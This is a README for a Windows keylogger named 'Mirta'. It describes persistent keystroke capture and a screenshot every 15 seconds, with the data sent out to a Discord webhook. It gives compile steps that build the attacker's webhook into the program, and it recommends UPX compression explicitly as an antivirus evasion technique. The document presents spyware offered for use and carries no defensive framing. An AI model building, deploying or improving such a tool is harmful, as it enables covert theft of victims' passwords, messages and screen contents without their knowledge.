# Mirta
A simple, persistent windows toy keylogger using discord webhooks to send data.
* Takes a screenshot of the primary display every 15 seconds
* Sends the keystroke when its size is about 0.15kb

## Setup
You will have to install gcc, make and upx (this one is for compress the executable post-compilation, it's a little evasion technique)<br>
To install these packages easily, i use [scoop](https://scoop.sh) as a package manager on windows.

`scoop install gcc make upx`


After that, you have to include the  _[stb_image_write.h](https://raw.githubusercontent.com/nothings/stb/refs/heads/master/stb_image_write.h)_ header file.
You could do that easily with cmd using curl.

`curl https://raw.githubusercontent.com/nothings/stb/refs/heads/master/stb_image_write.h > stb_image_write.h`

# Compile

`make all WEBHOOK="YOUR_DISCORD_WEBHOOK"`
